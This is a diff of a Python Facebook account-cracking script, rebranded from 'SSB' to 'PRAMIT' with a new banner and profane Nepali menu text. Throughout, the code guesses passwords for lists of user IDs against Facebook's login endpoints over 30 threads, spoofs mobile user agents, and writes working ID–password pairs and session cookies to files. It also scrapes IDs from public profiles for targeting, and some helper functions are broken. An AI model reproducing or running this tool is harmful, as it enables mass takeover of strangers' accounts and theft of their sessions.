@@ -30,7 +30,7 @@ except ModuleNotFoundError:
 
 from urllib.request import Request, urlopen
 import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
-from concurrent.futures import ThreadPoolExecutor as sarfrazssb
+from concurrent.futures import ThreadPoolExecutor as PRAMITPRAMIT
 from string import * 
 from random import randint
 from time import sleep as slp
@@ -61,39 +61,37 @@ def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
     END = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
-    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    ua = f'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36'+END
     return ua
 
 def randBuildvsskj():
     END = '[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935FD;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
-    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    ua = f'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36'+END
     return ua
 
-sys.stdout.write('\x1b]2; SSB\x07')
+sys.stdout.write('\x1b]2; PRAMIT\x07')
 S = '\033[1;37m'
 A = '\x1b[38;5;208m'
 R = '\x1b[38;5;46m'
 F = '\x1b[38;5;48m'
 Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-logo =                                          """            
-
-
-$$$$$$$\  $$$$$$$\   $$$$$$\  $$\      $$\ $$$$$$\ $$$$$$$$\        $$$$$$\   $$$$$$\  $$\   $$\  $$$$$$\  $$$$$$$\ $$\     $$\  $$$$$$\  
-$$  __$$\ $$  __$$\ $$  __$$\ $$$\    $$$ |\_$$  _|\__$$  __|      $$  __$$\ $$  __$$\ $$ |  $$ |$$  __$$\ $$  __$$\\$$\   $$  |$$  __$$\ 
-$$ |  $$ |$$ |  $$ |$$ /  $$ |$$$$\  $$$$ |  $$ |     $$ |         $$ /  $$ |$$ /  \__|$$ |  $$ |$$ /  $$ |$$ |  $$ |\$$\ $$  / $$ /  $$ |
-$$$$$$$  |$$$$$$$  |$$$$$$$$ |$$\$$\$$ $$ |  $$ |     $$ |         $$$$$$$$ |$$ |      $$$$$$$$ |$$$$$$$$ |$$$$$$$  | \$$$$  /  $$$$$$$$ |
-$$  ____/ $$  __$$< $$  __$$ |$$ \$$$  $$ |  $$ |     $$ |         $$  __$$ |$$ |      $$  __$$ |$$  __$$ |$$  __$$<   \$$  /   $$  __$$ |
-$$ |      $$ |  $$ |$$ |  $$ |$$ |\$  /$$ |  $$ |     $$ |         $$ |  $$ |$$ |  $$\ $$ |  $$ |$$ |  $$ |$$ |  $$ |   $$ |    $$ |  $$ |
-$$ |      $$ |  $$ |$$ |  $$ |$$ | \_/ $$ |$$$$$$\    $$ |         $$ |  $$ |\$$$$$$  |$$ |  $$ |$$ |  $$ |$$ |  $$ |   $$ |    $$ |  $$ |
-\__|      \__|  \__|\__|  \__|\__|     \__|\______|   \__|         \__|  \__| \______/ \__|  \__|\__|  \__|\__|  \__|   \__|    \__|  \__|
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
-\033[1;37m------------------------------------------------
-\033[1;37m Owner   :            PRAMIT ACHARYA
-\033[1;37m Facebook:            PRAMIT ACHARYA
-\033[1;37m Github  :            PramitGod
-\033[1;37m Version :            0.3
-\033[1;37m------------------------------------------------ """
+logo =    '\033[1;34m'                                      """            
+____  ____PRAMIT  ___BAU    __ VAN ____NATRA____MARLAS_____
+\033[1;36m_______   _______    ______   __       __  ______  ________ 
+\033[1;32m██████  ██████   █████  ███    ███ ██ ████████     
+\033[1;32m██   ██ ██   ██ ██   ██ ████  ████ ██    ██        
+\033[1;32m██████  ██████  ███████ ██ ████ ██ ██    ██        
+\033[1;32m██      ██   ██ ██   ██ ██  ██  ██ ██    ██        
+\033[1;32m██      ██   ██ ██   ██ ██      ██ ██    ██        
+\033[1;38m-----------x-------------PRAMIT BRAND ---------------X----------------\033[1;34m---------------------------EXE PRAMIT---------------------
+\033[1;38m Owner   :            PRAMIT ACHARYA
+\033[1;38m Facebook:            PRAMIT ACHARYA
+\033[1;38m Youtube  :           ACER GOD YT
+\033[1;38m Github  :            PramitGod
+\033[1;38m Commamd :          Paid Note This Command is not free
+\033[1;38m Version :            0.4
+\033[1;30m------------------------------------------------ """
 def clear():
     os.system("clear")
     print(logo)    
@@ -106,14 +104,14 @@ def result(OKs,cps):
         print(' TOTAL OK: %s' % str(len(oks)))
         print(' TOTAL CP: %s' % str(len(cps)))
         print(47*'-')
-        input("Press enter to back SSB Menu ")
+        input("Press enter to back PRAMIT Menu ")
         exit()
 
-def sarfraz():   
+def PRAMIT():   
     os.system('clear')
     print(logo)
     print(f'[1] File Crack')
-    print(f'[2] Public ID CrackVAKK NOT AVAILABLE 😂')
+    print(f'[2] Public ID Crack VAKK MUJI NOT AVAILABLE ')
     print(f'[3] Random Crack ')
     print(f'[4] Create File')
     print(f'[5] Login Tool')
@@ -121,14 +119,14 @@ def sarfraz():
     print(f'[7] Remove Trash Files ')
     print(f'[8] Separate Ids')
     print(f'[9] Remove Duplicate IDs')
-    print(f'[W] Whatsapp JOIN HAN ')
-    print(f'[F]TERO DAI KO Facebook  ')
+    print(f'[W] Whatsapp GROUP JOIN HAN MUJI MAJA AAUXA ')
+    print(f'[F] TERO BAU KO Facebook  ID FOLLOW HAN MUJI  ')
     print('')
-    select = input('Select Menu>: ')
+    select = input('MENU CHOOSE>: ')
     if select =='1':
         method_crack()
     elif select =='2':
-        exit(' This is Option Soon available ... ')
+        exit(' This is Option Soon available XITTEI UPALABDHA HUNEXA BUJIS ... ')
     elif select =='3':
         random_number()
     elif select =='4':
@@ -149,9 +147,9 @@ def sarfraz():
     elif select =='F':
         os.system('xdg-open https://www.facebook.com/profile.php?id=100090675191743')
     else:
-        print('\n Select valid option ... ')
+        print('\n Select valid option BUJI RAKH ... ')
         time.sleep(2)
-        SSB(allkey)
+        PRAMIT(allkey)
         
 def method_crack():
     global methods
@@ -176,9 +174,9 @@ def method_crack():
     #    methods.append('methodD')
    #     main_crack().crack(id)
     elif option =='0':
-        sarfraz()
+        PRAMIT()
     else:
-      print('\n Select Valid Option ...')
+      print('\n Select Valid Option J Paye Tei Choose Na Gar ...')
       time.sleep(2)
       method_crack()
 
@@ -188,12 +186,12 @@ class main_crack():
     def crack(self,id):
         global methods
         clear()
-        self.file = input('Put File Name : ')
+        self.file = input('File ko Name : ')
         try:
             self.id = open(self.file).read().splitlines()
             self.pasw()
         except FileNotFoundError:
-            print('Opps File Not Found ...')
+            print('Opps File Nei Vetena Muji ...')
             time.sleep(2)
             os.system('clear')
             print(logo)
@@ -204,7 +202,7 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[SSB] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[PRAMIT] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -252,15 +250,15 @@ class main_crack():
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);PRAMITb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={PRAMITb};{ckkk}"
+                    print(f"\r{R} [PRAMIT-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SSB_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/PRAMIT_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/PRAMIT_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     #print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                     #print(f"\r{A} [PRAMIT-CP] {sid} | {ps} {S}")
                      cps.append(sid)
-                     open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
+                     open('/sdcard/PRAMIT_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -270,7 +268,7 @@ class main_crack():
     def methodC(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[SSB] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[PRAMIT] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -318,15 +316,15 @@ class main_crack():
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);PRAMITb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={PRAMITb};{ckkk}"
+                    print(f"\r{R} [PRAMIT-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SSB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/PRAMIT_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/PRAMIT_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                    #  print(f"\r{A} [PRAMIT-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/PRAMIT_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -336,7 +334,7 @@ class main_crack():
     def methodB(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[SSB] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[PRAMIT] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -384,15 +382,15 @@ class main_crack():
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);PRAMITb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={PRAMITb};{ckkk}"
+                    print(f"\r{R} [PRAMIT-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SSB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/PRAMIT_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/PRAMIT_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                    #  print(f"\r{A} [PRAMIT-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/PRAMIT_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -401,7 +399,7 @@ class main_crack():
 
     def methodD(self, sid, name, psw):
         global oks,cps,loop
-        sys.stdout.write(f"\r {S}[SSB] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+        sys.stdout.write(f"\r {S}[PRAMIT] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
         sys.stdout.flush()
         fs = name.split(' ')[0]
         try:
@@ -419,14 +417,14 @@ class main_crack():
                 session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': sua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                 complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                 if 'c_user' in session.cookies.get_dict():
-                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
+                    print(f"\r{R} [PRAMIT-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/SSB_OK.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/PRAMIT_OK.txt','a').write(sid+'|'+ps+'\n')
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
-                    #print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                    #print(f"\r{A} [PRAMIT-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/PRAMIT_CP.txt','a').write(sid+'|'+ps+'\n')
                     break
                 else:
                     continue
@@ -455,12 +453,12 @@ class main_crack():
             os.system("clear")
             print(logo)
             
-            print(f"\r{A}Use flight (airplane) mode before use {S}")
+            print(f"\r{A}FAST IDZ AAUNA LAI AIRPLANE MODE USE GAR{S}")
             print(47*"-")
-            print(f'{S} Total IDs : %s ' % len(self.id))
-            print(f'{S} Cracking Started...')
+            print(f'{S} Total Id haru : %s ' % len(self.id))
+            print(f'{S} Cracking Suru Vayo......')
             print(47*"-")
-            with sarfrazssb(max_workers=30) as ssbworld:
+            with PRAMITPRAMIT(max_workers=30) as PRAMITworld:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -470,13 +468,13 @@ class main_crack():
                        else:
                             pwx =  pw
                             if 'methodA' in methods:
-                                ssbworld.submit(self.methodA, uid, name, pwx)
+                                PRAMITworld.submit(self.methodA, uid, name, pwx)
                             elif 'methodB' in methods:
-                                ssbworld.submit(self.methodB, uid, name, pwx)
+                                PRAMITworld.submit(self.methodB, uid, name, pwx)
                             elif 'methodC' in methods:
-                                ssbworld.submit(self.methodC, uid, name, pwx)
+                                PRAMITworld.submit(self.methodC, uid, name, pwx)
                             elif 'methodD' in methods:
-                                ssbworld.submit(self.methodD, uid, name, pwx)
+                                PRAMITworld.submit(self.methodD, uid, name, pwx)
                    except:pass
             result(oks,cps)   
             
@@ -538,7 +536,7 @@ def public():
             except KeyError:
                 print(f"\n{S}ID Not Found ...");pass
                 menu()
-        print(f'File Name To Dump Ids. Example /sdcard/SSB.txt') 
+        print(f'File Name To Dump Ids. Example /sdcard/PRAMIT.txt') 
         print(47*"-")
         filepath = input("Put File Name: ")
         os.system('rm -rf %s'%(filepath))
@@ -591,7 +589,7 @@ def follower():
         except KeyError:
             print(f"{A}ID Not Public");time.sleep(1)
             menu()
-        print(f'File Name To Dump Ids. Example /sdcard/SSB.txt') 
+        print(f'File Name To Dump Ids. Example /sdcard/PRAMIT.txt') 
         print(47*"-")
         filepath = input("Put File Name: ")
         os.system('rm -rf %s'%(filepath))
@@ -633,7 +631,7 @@ def sids():
     print('\033[1;37mPut limit between 1 to 10 \033[0;97m')
     limit = int(input('How many links do you want to separate?: '))
     clear()
-    print('\033[1;37mExample: /sdcard/SSB.txt\033[0;97m')
+    print('\033[1;37mExample: /sdcard/PRAMIT.txt\033[0;97m')
     print(47*'-')
     new_save = input('Save new file as: ')
     clear()
@@ -656,18 +654,18 @@ def cutter():
     os.system('clear')
     print(logo)
     print("Enter File Path / File Location \n")
-    ssb = input('Put File Name :')
+    PRAMIT = input('Put File Name :')
     print(" ")
-    sarfraz = input('Saving Put File Name :')
-    os.system('touch ' +sarfraz)
-    os.system('sort -r '+ssb+' | uniq > '+sarfraz)
+    PRAMIT = input('Saving Put File Name :')
+    os.system('touch ' +PRAMIT)
+    os.system('sort -r '+PRAMIT+' | uniq > '+PRAMIT)
     os.system('clear')
     print(logo)
-    print("Removed Successful From File : " + ssb )
+    print("Removed Successful From File : " + PRAMIT )
     print(47*'-')
-    print("File Saved To :" + sarfraz )
+    print("File Saved To :" + PRAMIT )
     print(47*'-')
-    input(f"{S} Press Enter To Back SSB Menu ")
+    input(f"{S} Press Enter To Back PRAMIT Menu ")
     menu
        
 
@@ -806,7 +804,7 @@ def p_dump():
         
         srange = int(input('How many IDs do you want to add?: ' ))
         clear()
-        print(f'{S}File Name To Dump Ids. Example /sdcard/SSB.txt\n') 
+        print(f'{S}File Name To Dump Ids. Example /sdcard/PRAMIT.txt\n') 
         filepath = input("Put File Name: ")
         apnd = open(filepath , 'a')
         clear()
@@ -829,30 +827,30 @@ def p_dump():
         print(f"Total IDs: {totaldmp} ")
         print(f"File Saved To  {filepath} ")
         print(47*'-')
-        input("Press enter to back SSB Menu ")
-        SSB(allkey)
+        input("Press enter to back PRAMIT Menu ")
+        PRAMIT(allkey)
     except Exception as e:
         print("Error : %s"%e) 
         
 def cutter():
     clear()
     print("Enter File Path / File Location \n")
-    ssb = input('Put File Name:')
+    PRAMIT = input('Put File Name:')
     print(" ")
-    sarfraz = input('Saving Put File Name:')
-    os.system('touch ' +sarfraz)
-    os.system('sort -r '+ssb+' | uniq > '+sarfraz)
+    PRAMIT = input('Saving Put File Name:')
+    os.system('touch ' +PRAMIT)
+    os.system('sort -r '+PRAMIT+' | uniq > '+PRAMIT)
     os.system('clear')
     print(logo)
-    print("Removed Successful From File: " + ssb )
-    print("New File Saved:" + sarfraz )
+    print("Removed Successful From File: " + PRAMIT )
+    print("New File Saved:" + PRAMIT )
     print(47*'-')
-    input(f"{S} Press Enter To Back SSB Menu ")
-    SSB(allkey)       
+    input(f"{S} Press Enter To Back PRAMIT Menu ")
+    PRAMIT(allkey)       
     
 def removef():
         os.system('rm -rf self.file');print(f'\n{R}Files Removed Successfully ...')
-        SSB(allkey)            
+        PRAMIT(allkey)            
  
 
-sarfraz()
+PRAMIT()
